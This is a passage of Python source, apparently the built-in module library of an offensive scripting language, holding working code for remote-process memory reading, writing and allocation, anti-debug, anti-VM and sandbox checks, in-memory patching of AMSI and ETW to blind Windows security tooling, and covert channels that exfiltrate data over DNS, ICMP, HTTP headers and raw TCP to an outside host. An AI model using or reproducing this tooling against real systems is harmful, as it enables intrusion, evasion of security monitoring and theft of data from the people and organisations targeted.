        "dll":        lambda pid, path: _dll_inject(pid, path),
        "apc":        lambda pid, sc: _apc_inject(pid, sc),
        "is_windows": lambda: _rv(_is_win, "bool"),
    }


# ═══════════════════════════════════════════════════════════════════════
# MEMORY MANIPULATION  (Windows API via ctypes)
# ═══════════════════════════════════════════════════════════════════════

def mem_module() -> Dict[str, Callable]:
    import platform
    import ctypes
    _is_win = platform.system() == "Windows"

    PROCESS_ALL_ACCESS     = 0x1F0FFF
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    MEM_RELEASE            = 0x8000
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE         = 0x04
    PAGE_READONLY          = 0x02
    PAGE_NOACCESS          = 0x01
    MEM_COMMIT_STATE       = 0x1000

    def _k32():
        if not _is_win:
            raise RuntimeError("mem module requires Windows")
        return ctypes.windll.kernel32

    def _open_proc(pid):
        h = _k32().OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h:
            raise RuntimeError(f"OpenProcess failed for PID {pid} (err={ctypes.GetLastError()})")
        return h

    def _mem_read(pid, addr, size):
        pid, addr, size = _v(pid), _v(addr), _v(size)
        k32 = _k32()
        h = _open_proc(pid)
        try:
            buf  = (ctypes.c_char * size)()
            read = ctypes.c_size_t(0)
            if not k32.ReadProcessMemory(h, addr, buf, size, ctypes.byref(read)):
                return _rv(None, "null")
            from interpreter import KoppaBytes
            return _rv(KoppaBytes(bytes(buf[:read.value])), "bytes")
        finally:
            k32.CloseHandle(h)

    def _mem_write(pid, addr, data):
        pid, addr = _v(pid), _v(addr)
        raw = _v(data)
        if hasattr(raw, "data"):
            data_bytes = raw.data
        elif isinstance(raw, (bytes, bytearray)):
            data_bytes = bytes(raw)
        elif isinstance(raw, str):
            data_bytes = raw.encode()
        else:
            data_bytes = bytes([raw]) if isinstance(raw, int) else b""
        k32 = _k32()
        h = _open_proc(pid)
        try:
            buf     = (ctypes.c_char * len(data_bytes))(*data_bytes)
            written = ctypes.c_size_t(0)
            ok = k32.WriteProcessMemory(h, addr, buf, len(data_bytes), ctypes.byref(written))
            return _rv({"ok": bool(ok), "written": written.value}, "dict")
        finally:
            k32.CloseHandle(h)

    def _mem_alloc(pid, size, prot=None):
        pid, size = _v(pid), _v(size)
        prot = _v(prot) if prot is not None else PAGE_EXECUTE_READWRITE
        k32 = _k32()
        h = _open_proc(pid)
        try:
            addr = k32.VirtualAllocEx(h, None, size, MEM_COMMIT | MEM_RESERVE, prot)
            return _rv(addr, "int")
        finally:
            k32.CloseHandle(h)

    def _mem_free(pid, addr):
        pid, addr = _v(pid), _v(addr)
        k32 = _k32()
        h = _open_proc(pid)
        try:
            return _rv(bool(k32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)), "bool")
        finally:
            k32.CloseHandle(h)

    def _mem_protect(pid, addr, size, prot):
        pid, addr, size, prot = _v(pid), _v(addr), _v(size), _v(prot)
        k32 = _k32()
        h = _open_proc(pid)
        try:
            old = ctypes.c_ulong(0)
            ok  = k32.VirtualProtectEx(h, addr, size, prot, ctypes.byref(old))
            return _rv({"ok": bool(ok), "old_prot": old.value}, "dict")
        finally:
            k32.CloseHandle(h)

    def _mem_scan(pid, pattern):
        pid = _v(pid)
        raw = _v(pattern)
        if hasattr(raw, "data"):
            pat = raw.data
        elif isinstance(raw, str):
            pat = bytes.fromhex(raw.replace(" ", "").replace("\\x", ""))
        else:
            pat = bytes(raw)

        k32 = _k32()
        h   = _open_proc(pid)

        class MEMORY_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("BaseAddress",       ctypes.c_void_p),
                ("AllocationBase",    ctypes.c_void_p),
                ("AllocationProtect", ctypes.c_ulong),
                ("RegionSize",        ctypes.c_size_t),
                ("State",             ctypes.c_ulong),
                ("Protect",           ctypes.c_ulong),
                ("Type",              ctypes.c_ulong),
            ]

        class SYSTEM_INFO(ctypes.Structure):
            _fields_ = [
                ("wProcessorArchitecture",      ctypes.c_uint16),
                ("wReserved",                   ctypes.c_uint16),
                ("dwPageSize",                  ctypes.c_ulong),
                ("lpMinimumApplicationAddress", ctypes.c_void_p),
                ("lpMaximumApplicationAddress", ctypes.c_void_p),
                ("dwActiveProcessorMask",       ctypes.POINTER(ctypes.c_ulong)),
                ("dwNumberOfProcessors",        ctypes.c_ulong),
                ("dwProcessorType",             ctypes.c_ulong),
                ("dwAllocationGranularity",     ctypes.c_ulong),
                ("wProcessorLevel",             ctypes.c_uint16),
                ("wProcessorRevision",          ctypes.c_uint16),
            ]

        try:
            si = SYSTEM_INFO()
            k32.GetSystemInfo(ctypes.byref(si))
            cur  = si.lpMinimumApplicationAddress
            top  = si.lpMaximumApplicationAddress
            mbi  = MEMORY_BASIC_INFORMATION()
            hits = []
            while cur < top and len(hits) < 128:
                if k32.VirtualQueryEx(h, cur, ctypes.byref(mbi), ctypes.sizeof(mbi)) == 0:
                    break
                if mbi.State == MEM_COMMIT_STATE:
                    chunk = min(mbi.RegionSize, 0x100000)
                    buf   = (ctypes.c_char * chunk)()
                    read  = ctypes.c_size_t(0)
                    if k32.ReadProcessMemory(h, cur, buf, chunk, ctypes.byref(read)):
                        data = bytes(buf[:read.value])
                        idx  = 0
                        while True:
                            pos = data.find(pat, idx)
                            if pos == -1:
                                break
                            hits.append(_rv(cur + pos, "int"))
                            idx = pos + 1
                cur = cur + mbi.RegionSize
            return _rv(hits, "array")
        finally:
            k32.CloseHandle(h)

    def _mem_modules(pid):
        pid = _v(pid)
        if not _is_win:
            return _rv([], "array")
        k32   = _k32()
        psapi = ctypes.windll.psapi
        h     = _open_proc(pid)
        try:
            mods      = (ctypes.c_void_p * 1024)()
            cb_needed = ctypes.c_ulong(0)
            if not psapi.EnumProcessModules(h, mods, ctypes.sizeof(mods), ctypes.byref(cb_needed)):
                return _rv([], "array")
            count  = cb_needed.value // ctypes.sizeof(ctypes.c_void_p)

            class MODULEINFO(ctypes.Structure):
                _fields_ = [
                    ("lpBaseOfDll", ctypes.c_void_p),
                    ("SizeOfImage", ctypes.c_ulong),
                    ("EntryPoint",  ctypes.c_void_p),
                ]

            result = []
            for i in range(min(count, 1024)):
                name_buf = ctypes.create_unicode_buffer(260)
                psapi.GetModuleFileNameExW(h, mods[i], name_buf, 260)
                mi = MODULEINFO()
                psapi.GetModuleInformation(h, mods[i], ctypes.byref(mi), ctypes.sizeof(mi))
                import os
                result.append(_rv({
                    "name":  os.path.basename(name_buf.value),
                    "path":  name_buf.value,
                    "base":  mi.lpBaseOfDll,
                    "size":  mi.SizeOfImage,
                    "entry": mi.EntryPoint,
                }, "dict"))
            return _rv(result, "array")
        finally:
            k32.CloseHandle(h)

    return {
        "read":                   lambda pid, addr, size: _mem_read(pid, addr, size),
        "write":                  lambda pid, addr, data: _mem_write(pid, addr, data),
        "alloc":                  lambda pid, size, prot=None: _mem_alloc(pid, size, prot),
        "free":                   lambda pid, addr: _mem_free(pid, addr),
        "protect":                lambda pid, addr, size, prot: _mem_protect(pid, addr, size, prot),
        "scan":                   lambda pid, pattern: _mem_scan(pid, pattern),
        "modules":                lambda pid: _mem_modules(pid),
        "PAGE_NOACCESS":          _rv(0x01, "int"),
        "PAGE_READONLY":          _rv(0x02, "int"),
        "PAGE_READWRITE":         _rv(0x04, "int"),
        "PAGE_EXECUTE":           _rv(0x10, "int"),
        "PAGE_EXECUTE_READ":      _rv(0x20, "int"),
        "PAGE_EXECUTE_READWRITE": _rv(0x40, "int"),
    }


# ═══════════════════════════════════════════════════════════════════════
# EVASION  (Anti-debug / Anti-VM / Anti-Sandbox)
# ═══════════════════════════════════════════════════════════════════════

def evasion_module() -> Dict[str, Callable]:
    import platform
    import os
    import ctypes
    import time as _time
    import random
    _is_win = platform.system() == "Windows"

    def _is_debugged():
        if not _is_win:
            try:
                with open("/proc/self/status") as f:
                    for line in f:
                        if line.startswith("TracerPid:"):
                            return _rv(int(line.split()[1]) != 0, "bool")
            except Exception:
                pass
            return _rv(False, "bool")
        return _rv(bool(ctypes.windll.kernel32.IsDebuggerPresent()), "bool")

    def _is_remote_debugged():
        if not _is_win:
            return _rv(False, "bool")
        k32    = ctypes.windll.kernel32
        is_dbg = ctypes.c_bool(False)
        k32.CheckRemoteDebuggerPresent(k32.GetCurrentProcess(), ctypes.byref(is_dbg))
        return _rv(is_dbg.value, "bool")

    def _is_vm():
        signs = []
        if _is_win:
            import winreg
            vm_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmhgfs"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters"),
            ]
            for hive, key in vm_keys:
                try:
                    winreg.OpenKey(hive, key)
                    signs.append("registry:" + key.split("\\")[-1])
                except Exception:
                    pass
            for f in [r"C:\windows\system32\vmtoolsd.exe", r"C:\windows\system32\vboxservice.exe"]:
                if os.path.exists(f):
                    signs.append("file:" + os.path.basename(f))
            try:
                import subprocess
                r = subprocess.run(["wmic", "computersystem", "get", "model"],
                                   capture_output=True, text=True, timeout=3)
                if any(x in r.stdout.lower() for x in ["virtual", "vmware", "vbox", "qemu"]):
                    signs.append("wmic:virtual_model")
            except Exception:
                pass
        else:
            try:
                with open("/proc/cpuinfo") as f:
                    if "hypervisor" in f.read().lower():
                        signs.append("cpuinfo:hypervisor_flag")
            except Exception:
                pass
            try:
                with open("/sys/class/dmi/id/product_name") as f:
                    p = f.read().strip().lower()
                    if any(v in p for v in ["vmware", "virtualbox", "kvm", "qemu", "xen"]):
                        signs.append("dmi:" + p)
            except Exception:
                pass
        return _rv({"detected": len(signs) > 0, "indicators": [_rv(s, "string") for s in signs]}, "dict")

    def _is_sandbox():
        signs = []
        if os.cpu_count() and os.cpu_count() < 2:
            signs.append("single_cpu")
        suspect_users = {"sandbox", "malware", "virus", "sample", "test", "john", "joe", "user"}
        user = os.environ.get("USERNAME", os.environ.get("USER", "")).lower()
        if user in suspect_users:
            signs.append("suspect_user:" + user)
        if _is_win:
            for f in [r"C:\agent\agent.py", r"C:\sandbox\starter.exe"]:
                if os.path.exists(f):
                    signs.append("file:" + f)
            try:
                user32 = ctypes.windll.user32
                w, h   = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
                if w < 800 or h < 600:
                    signs.append(f"low_res:{w}x{h}")
            except Exception:
                pass
        try:
            import psutil
            if psutil.virtual_memory().total < 2 * 1024 ** 3:
                signs.append("low_ram")
        except Exception:
            pass
        return _rv({"detected": len(signs) > 0, "indicators": [_rv(s, "string") for s in signs]}, "dict")

    def _is_wine():
        if not _is_win:
            return _rv(False, "bool")
        try:
            proc = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll"), b"wine_get_version"
            )
            return _rv(bool(proc), "bool")
        except Exception:
            return _rv(False, "bool")

    def _patch_etw():
        if not _is_win:
            return _rv({"ok": False, "error": "Windows only"}, "dict")
        try:
            k32 = ctypes.windll.kernel32
            fn  = k32.GetProcAddress(k32.GetModuleHandleW("ntdll.dll"), b"NtTraceEvent")
            if not fn:
                return _rv({"ok": False, "error": "NtTraceEvent not found"}, "dict")
            old = ctypes.c_ulong(0)
            k32.VirtualProtect(fn, 1, 0x40, ctypes.byref(old))
            ctypes.cast(fn, ctypes.POINTER(ctypes.c_uint8))[0] = 0xC3  # RET
            k32.VirtualProtect(fn, 1, old.value, ctypes.byref(old))
            return _rv({"ok": True, "target": "NtTraceEvent", "patch": "RET"}, "dict")
        except Exception as e:
            return _rv({"ok": False, "error": str(e)}, "dict")

    def _patch_amsi():
        if not _is_win:
            return _rv({"ok": False, "error": "Windows only"}, "dict")
        try:
            k32 = ctypes.windll.kernel32
            try:
                k32.LoadLibraryW("amsi.dll")
            except Exception:
                pass
            fn = k32.GetProcAddress(k32.GetModuleHandleW("amsi.dll"), b"AmsiScanBuffer")
            if not fn:
                return _rv({"ok": False, "error": "AmsiScanBuffer not found — amsi.dll not loaded"}, "dict")
            patch = bytes([0x31, 0xC0, 0xC3])   # xor eax,eax ; ret
            old   = ctypes.c_ulong(0)
            k32.VirtualProtect(fn, len(patch), 0x40, ctypes.byref(old))
            buf = (ctypes.c_uint8 * len(patch))(*patch)
            ctypes.memmove(fn, buf, len(patch))
            k32.VirtualProtect(fn, len(patch), old.value, ctypes.byref(old))
            return _rv({"ok": True, "target": "AmsiScanBuffer", "patch": "xor_eax_ret"}, "dict")
        except Exception as e:
            return _rv({"ok": False, "error": str(e)}, "dict")

    def _sleep_jitter(seconds, jitter_pct=None):
        seconds     = _v(seconds)
        jitter_pct  = _v(jitter_pct) if jitter_pct is not None else 0.2
        jitter      = seconds * jitter_pct * (2 * random.random() - 1)
        actual      = max(0.0, seconds + jitter)
        start       = _time.perf_counter()
        _time.sleep(actual)
        elapsed     = _time.perf_counter() - start
        ratio       = elapsed / actual if actual > 0 else 1.0
        return _rv({"slept": round(elapsed, 4), "ratio": round(ratio, 4), "accelerated": ratio < 0.5}, "dict")

    def _check_parent():
        if not _is_win:
            try:
                return _rv({"ppid": os.getppid()}, "dict")
            except Exception:
                return _rv({"ppid": -1}, "dict")
        try:
            k32   = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll

            class PBI(ctypes.Structure):
                _fields_ = [
                    ("ExitStatus",     ctypes.c_void_p),
                    ("PebBaseAddress", ctypes.c_void_p),
                    ("AffinityMask",   ctypes.c_void_p),
                    ("BasePriority",   ctypes.c_void_p),
                    ("UniqueProcessId",ctypes.c_void_p),
                    ("InheritedFromUniqueProcessId", ctypes.c_void_p),
                ]

            pbi    = PBI()
            retlen = ctypes.c_ulong(0)
            ntdll.NtQueryInformationProcess(k32.GetCurrentProcess(), 0,
                                            ctypes.byref(pbi), ctypes.sizeof(pbi),
                                            ctypes.byref(retlen))
            ppid = pbi.InheritedFromUniqueProcessId
            parent_name = "unknown"
            hp = k32.OpenProcess(0x0400, False, ppid)
            if hp:
                buf  = ctypes.create_unicode_buffer(260)
                size = ctypes.c_ulong(260)
                ctypes.windll.psapi.GetModuleFileNameExW(hp, None, buf, size)
                parent_name = os.path.basename(buf.value)
                k32.CloseHandle(hp)
            suspicious_parents = {
                "excel.exe", "winword.exe", "outlook.exe", "powerpnt.exe",
                "mshta.exe", "wscript.exe", "cscript.exe", "rundll32.exe",
            }
            return _rv({
                "ppid":        ppid,
                "parent_name": parent_name,
                "suspicious":  parent_name.lower() in suspicious_parents,
            }, "dict")
        except Exception as e:
            return _rv({"error": str(e)}, "dict")

    return {
        "is_debugged":        lambda: _is_debugged(),
        "is_remote_debugged": lambda: _is_remote_debugged(),
        "is_vm":              lambda: _is_vm(),
        "is_sandbox":         lambda: _is_sandbox(),
        "is_wine":            lambda: _is_wine(),
        "patch_etw":          lambda: _patch_etw(),
        "patch_amsi":         lambda: _patch_amsi(),
        "sleep":              lambda s, j=None: _sleep_jitter(s, j),
        "check_parent":       lambda: _check_parent(),
    }


# ═══════════════════════════════════════════════════════════════════════
# COVERT CHANNELS  (DNS / ICMP / HTTP / TCP)
# ═══════════════════════════════════════════════════════════════════════

def covert_module() -> Dict[str, Callable]:
    import base64
    import socket
    import struct
    import random
    import time as _time

    def _to_bytes(val):
        raw = _v(val)
        if hasattr(raw, "data"):
            return raw.data
        if isinstance(raw, (bytes, bytearray)):
            return bytes(raw)
        if isinstance(raw, str):
            return raw.encode()
        return b""

    def _dns_encode(data, domain):
        domain  = _v(domain)
        encoded = base64.b32encode(_to_bytes(data)).decode().lower().rstrip("=")
        chunks  = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
        fqdn    = ".".join(chunks) + "." + domain
        return _rv({"fqdn": fqdn, "domain": domain, "chunks": len(chunks)}, "dict")

    def _dns_decode(subdomain, domain=None):
        subdomain = _v(subdomain)
        domain    = _v(domain) if domain else None
        # Strip trailing domain suffix if provided
        if domain and subdomain.endswith("." + domain):
            subdomain = subdomain[:-(len(domain) + 1)]
        elif domain and subdomain.endswith(domain):
            subdomain = subdomain[:-len(domain)].rstrip(".")
        # Reassemble all label chunks
        encoded   = "".join(subdomain.split(".")).upper()
        pad       = (8 - len(encoded) % 8) % 8
        encoded  += "=" * pad
        try:
            return _rv(base64.b32decode(encoded).decode("utf-8", errors="replace"), "string")
        except Exception as e:
            return _rv({"error": str(e)}, "dict")

    def _dns_exfil(data, domain, nameserver=None):
        domain     = _v(domain)
        nameserver = _v(nameserver) if nameserver else None
        encoded    = base64.b32encode(_to_bytes(data)).decode().lower().rstrip("=")
        chunks     = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
        sent = 0
        errs = []
        for i, chunk in enumerate(chunks):
            query = f"{i}.{chunk}.{domain}"
            try:
                if nameserver:
                    txid   = random.randint(0, 65535)
                    header = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
                    qbody  = b""
                    for label in query.split("."):
                        enc    = label.encode()
                        qbody += bytes([len(enc)]) + enc
                    qbody += b"\x00" + struct.pack("!HH", 1, 1)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                    sock.sendto(header + qbody, (nameserver, 53))
                    sock.close()
                else:
                    socket.gethostbyname(query)
                sent += 1
                _time.sleep(0.1)
            except Exception as e:
                errs.append(str(e))
        return _rv({"chunks_sent": sent, "total": len(chunks), "errors": len(errs)}, "dict")

    def _icmp_send(host, data):
        host = _v(host)
        raw  = _to_bytes(data)

        def _chksum(pkt):
            if len(pkt) % 2:
                pkt += b"\x00"
            s = sum(struct.unpack("!%dH" % (len(pkt) // 2), pkt))
            s = (s >> 16) + (s & 0xFFFF)
            s += s >> 16
            return ~s & 0xFFFF

        try:
            icmp_id  = random.randint(0, 65535)
            hdr      = struct.pack("bbHHh", 8, 0, 0, icmp_id, 1)
            chk      = _chksum(hdr + raw)
            hdr      = struct.pack("bbHHh", 8, 0, chk, icmp_id, 1)
            sock     = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(3)
            sock.sendto(hdr + raw, (host, 0))
            sock.close()
            return _rv({"ok": True, "host": host, "bytes": len(raw)}, "dict")
        except PermissionError:
            return _rv({"ok": False, "error": "requires admin/root for raw sockets"}, "dict")
        except Exception as e:
            return _rv({"ok": False, "error": str(e)}, "dict")

    def _http_hide(url, data, header_name=None):
        import urllib.request
        url         = _v(url)
        header_name = _v(header_name) if header_name else "X-Request-ID"
        encoded     = base64.b64encode(_to_bytes(data)).decode()
        try:
            req = urllib.request.Request(url, headers={
                header_name:  encoded,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            })
            with urllib.request.urlopen(req, timeout=10) as resp:
                return _rv({"ok": True, "status": resp.status, "header": header_name}, "dict")
        except Exception as e:
            return _rv({"ok": False, "error": str(e)}, "dict")

    def _tcp_covert(host, port, data):
        host, port = _v(host), _v(port)
        raw        = _to_bytes(data)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            frame = b"\xDE\xAD\xBE\xEF" + struct.pack("!I", len(raw)) + raw
            sock.send(frame)
            sock.close()
            return _rv({"ok": True, "bytes": len(raw)}, "dict")
        except Exception as e:
            return _rv({"ok": False, "error": str(e)}, "dict")

    return {
        "dns_encode": lambda data, domain: _dns_encode(data, domain),
        "dns_decode": lambda sub, domain=None: _dns_decode(sub, domain),
        "dns_exfil":  lambda data, domain, ns=None: _dns_exfil(data, domain, ns),
        "icmp_send":  lambda host, data: _icmp_send(host, data),
        "http_hide":  lambda url, data, hdr=None: _http_hide(url, data, hdr),
        "tcp_covert": lambda host, port, data: _tcp_covert(host, port, data),
    }


# ═══════════════════════════════════════════════════════════════════════
# ADVANCED CRYPTOGRAPHY  (AES / ChaCha20 / RC4 / RSA / KDF)
# ═══════════════════════════════════════════════════════════════════════

def crypt_module() -> Dict[str, Callable]:
    import os
    import hashlib
    import hmac as _hmac

    def _to_bytes(val):
        raw = _v(val)
        if hasattr(raw, "data"):
            return raw.data
        if isinstance(raw, (bytes, bytearray)):
            return bytes(raw)
        if isinstance(raw, str):
            return raw.encode()
        return b""

    def _to_key(val, length=32):
        raw = _to_bytes(val)
        if len(raw) in (16, 24, 32):
            return raw
        return hashlib.sha256(raw).digest()[:length]

    def _kb(data):
        from interpreter import KoppaBytes
        if isinstance(data, bytes):
            return _rv(KoppaBytes(data), "bytes")
        return _rv(KoppaBytes(bytes(data)), "bytes")

    def _xor_cipher(data, key):
        d = _to_bytes(data)
        k = _to_bytes(key)
        if not k:
            return _kb(d)
        return _kb(bytes(d[i] ^ k[i % len(k)] for i in range(len(d))))

    def _rc4(data, key):
        d = _to_bytes(data)
        k = _to_bytes(key)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + k[i % len(k)]) % 256
            S[i], S[j] = S[j], S[i]
        i = j = 0
        out = bytearray()
        for byte in d:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(byte ^ S[(S[i] + S[j]) % 256])
        return _kb(bytes(out))

    def _aes_encrypt(plaintext, key, iv=None, mode=None):
        pt  = _to_bytes(plaintext)
        k   = _to_key(key)
        iv_val = _to_bytes(iv) if iv else os.urandom(16)
        if not iv_val or len(iv_val) != 16:
            iv_val = os.urandom(16)
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            ct = AES.new(k, AES.MODE_CBC, iv_val).encrypt(pad(pt, 16))
        except ImportError:
            try:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes as cmodes
                from cryptography.hazmat.primitives import padding
                from cryptography.hazmat.backends import default_backend
                padder  = padding.PKCS7(128).padder()
                padded  = padder.update(pt) + padder.finalize()
                enc     = Cipher(algorithms.AES(k), cmodes.CBC(iv_val), backend=default_backend()).encryptor()
                ct      = enc.update(padded) + enc.finalize()
            except ImportError:
                return _rv({"error": "pip install pycryptodome  OR  pip install cryptography"}, "dict")
        from interpreter import KoppaBytes
        return _rv({
            "ciphertext": _rv(KoppaBytes(ct), "bytes"),
            "iv":         _rv(KoppaBytes(iv_val), "bytes"),
            "key_bits":   len(k) * 8,
        }, "dict")

    def _aes_decrypt(ciphertext, key, iv):
        ct  = _to_bytes(ciphertext)
        k   = _to_key(key)
        iv2 = _to_bytes(iv)
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad
            return _kb(unpad(AES.new(k, AES.MODE_CBC, iv2).decrypt(ct), 16))
        except ImportError:
            try:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes as cmodes
                from cryptography.hazmat.primitives import padding
                from cryptography.hazmat.backends import default_backend
                dec    = Cipher(algorithms.AES(k), cmodes.CBC(iv2), backend=default_backend()).decryptor()
                padded = dec.update(ct) + dec.finalize()
                unpad  = padding.PKCS7(128).unpadder()
                return _kb(unpad.update(padded) + unpad.finalize())
            except ImportError:
                return _rv({"error": "pip install pycryptodome  OR  pip install cryptography"}, "dict")

    def _chacha20(data, key, nonce=None):
        d     = _to_bytes(data)
        k     = _to_key(key, 32)
        n_val = _to_bytes(nonce) if nonce else os.urandom(16)
        if len(n_val) not in (8, 12, 16):
            n_val = os.urandom(16)
        try:
            from Crypto.Cipher import ChaCha20
            n12 = n_val[:16] if len(n_val) >= 16 else n_val.ljust(16, b"\x00")
            ct  = ChaCha20.new(key=k, nonce=n12).encrypt(d)
        except ImportError:
            try:
                from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
                n12 = n_val[:12] if len(n_val) >= 12 else n_val.ljust(12, b"\x00")
                ct  = ChaCha20Poly1305(k).encrypt(n12, d, None)
            except ImportError:
                return _rv({"error": "pip install pycryptodome  OR  pip install cryptography"}, "dict")
        from interpreter import KoppaBytes
        return _rv({
            "ciphertext": _rv(KoppaBytes(ct), "bytes"),
            "nonce":      _rv(KoppaBytes(n_val), "bytes"),
        }, "dict")

    def _rsa_gen(bits=None):
        bits = int(_v(bits)) if bits else 2048
        try:
            from Crypto.PublicKey import RSA
            k = RSA.generate(bits)
            return _rv({
                "private_pem": k.export_key().decode(),
                "public_pem":  k.publickey().export_key().decode(),
                "bits":        bits,
            }, "dict")
        except ImportError:
            try:
                from cryptography.hazmat.primitives.asymmetric import rsa
                from cryptography.hazmat.primitives import serialization
                from cryptography.hazmat.backends import default_backend
                priv = rsa.generate_private_key(65537, bits, backend=default_backend())
                return _rv({
                    "private_pem": priv.private_bytes(
                        serialization.Encoding.PEM,
                        serialization.PrivateFormat.TraditionalOpenSSL,
                        serialization.NoEncryption()
                    ).decode(),
                    "public_pem": priv.public_key().public_bytes(
                        serialization.Encoding.PEM,
                        serialization.PublicFormat.SubjectPublicKeyInfo
                    ).decode(),
                    "bits": bits,
                }, "dict")
            except ImportError:
                return _rv({"error": "pip install pycryptodome  OR  pip install cryptography"}, "dict")

    def _derive_key(password, salt=None, iters=None, length=None, algo=None):
        pw     = _to_bytes(password)
        salt   = _to_bytes(salt) if salt else os.urandom(16)
        if not salt:
            salt = os.urandom(16)
        iters  = int(_v(iters)) if iters else 100_000
        length = int(_v(length)) if length else 32
        algo   = _v(algo) if algo else "sha256"
        key    = hashlib.pbkdf2_hmac(algo, pw, salt, iters, length)
        from interpreter import KoppaBytes
        return _rv({
            "key":        _rv(KoppaBytes(key), "bytes"),
            "salt":       _rv(KoppaBytes(salt), "bytes"),
            "algorithm":  f"pbkdf2_{algo}",
            "iterations": iters,
        }, "dict")

    def _gen_key(bits=None):
        bits = int(_v(bits)) if bits else 256
        return _kb(os.urandom(bits // 8))

    def _hmac_sign(data, key, algo=None):
        algo = _v(algo) if algo else "sha256"
        return _rv(_hmac.new(_to_bytes(key), _to_bytes(data), algo).hexdigest(), "string")

    return {
        "xor":         lambda data, key: _xor_cipher(data, key),
        "rc4":         lambda data, key: _rc4(data, key),
        "aes_encrypt": lambda pt, key, iv=None: _aes_encrypt(pt, key, iv),
        "aes_decrypt": lambda ct, key, iv: _aes_decrypt(ct, key, iv),
        "chacha20":    lambda data, key, nonce=None: _chacha20(data, key, nonce),
        "rsa_gen":     lambda bits=None: _rsa_gen(bits),
        "derive_key":  lambda pwd, salt=None, iters=None, length=None, algo=None: _derive_key(pwd, salt, iters, length, algo),
        "gen_key":     lambda bits=None: _gen_key(bits),
        "gen_iv":      lambda: _kb(os.urandom(16)),
        "hmac":        lambda data, key, algo=None: _hmac_sign(data, key, algo),
    }


ALL_MODULES = {
    "native_str":    str_module,
    "native_list":   list_module,
    "native_math":   math_module,
    "native_rand":   rand_module,
    "native_time":   time_module,
    "native_regex":  regex_module,
    "native_json":   json_module,
    "native_fs":     fs_module,
    "native_os":     os_module,
    "native_color":  color_module,
    "native_fmt":    fmt_module,
    "native_net":    net_module,
    "native_dns":    dns_module,
    "native_ssl":    ssl_module,
    "native_encode": encode_module,
    "native_hash":   hash_module,
    "native_jwt":    jwt_module,
    "native_fuzz":   fuzz_module,
    "native_brute":  brute_module,
    "native_parse":  parse_module,
    "native_report": report_module,
    "native_smtp":    smtp_module,
    "native_ftp":     ftp_module,
    "native_vuln":    vuln_module,
    "native_session": session_module,
    "native_payload": payload_module,
    "native_bypass":  bypass_module,
    "native_advscan": adv_scan_module,
    # Security-native
    "native_inject":  inject_module,
    "native_mem":     mem_module,
    "native_evasion": evasion_module,
    "native_covert":  covert_module,
    "native_crypt":   crypt_module,
}

MODULE_ALIASES = {
    "str":    "native_str",
    "list":   "native_list",
    "math":   "native_math",
    "rand":   "native_rand",
    "time":   "native_time",
    "regex":  "native_regex",
    "json":   "native_json",
    "fs":     "native_fs",
    "os":     "native_os",
    "color":  "native_color",
    "fmt":    "native_fmt",
    "net":    "native_net",
    "dns":    "native_dns",
    "ssl":    "native_ssl",
    "encode": "native_encode",
    "hash":   "native_hash",
    "jwt":    "native_jwt",
    "fuzz":   "native_fuzz",
    "brute":  "native_brute",
    "parse":  "native_parse",
    "report": "native_report",
    "smtp":    "native_smtp",
    "ftp":     "native_ftp",
    "vuln":    "native_vuln",
    "session": "native_session",
    "payload": "native_payload",
    "bypass":  "native_bypass",
    "scan":    "native_advscan",
    # Security-native
    "inject":  "native_inject",
    "mem":     "native_mem",
    "evasion": "native_evasion",
    "covert":  "native_covert",
    "crypt":   "native_crypt",
}
